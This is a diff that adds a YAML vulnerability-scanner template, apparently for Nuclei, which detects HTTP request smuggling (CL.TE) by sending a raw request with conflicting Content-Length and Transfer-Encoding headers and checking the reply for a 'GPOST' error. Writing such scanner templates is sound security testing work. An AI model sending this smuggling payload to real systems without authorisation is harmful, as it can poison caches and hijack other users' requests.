@@ -1,0 +1,33 @@
+id: cwe-444-http-request-smuggling
+info:
+  name: HTTP Request Smuggling Detection
+  author: security-all-in-one
+  severity: critical
+  description: Tests for CL.TE and TE.CL request smuggling
+  classification:
+    cwe-id: CWE-444
+    cvss-score: 9.8
+  tags: smuggling,cwe-444,dast,bug-bounty
+
+http:
+  # CL.TE smuggling
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        G
+
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Unrecognized method GPOST"
+          - "Method Not Allowed"
+        condition: or
